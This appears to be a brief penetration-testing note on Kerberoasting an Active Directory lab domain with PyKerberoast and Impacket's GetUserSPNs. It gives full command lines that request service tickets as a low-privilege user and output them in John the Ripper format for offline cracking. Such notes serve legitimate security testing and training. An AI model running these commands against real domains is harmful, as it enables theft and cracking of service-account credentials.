PyKerberoast
https://github.com/skelsec/PyKerberoast
Requires python-ldap

Makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format.

kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
                [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v]

root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b "dc=sittingduck,dc=info" -d sittingduck -u notanadmin

Impacket
GetUserSPNs
By adding a -request to the command, we can request all user SPN tickets and they are output in JtR format

root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
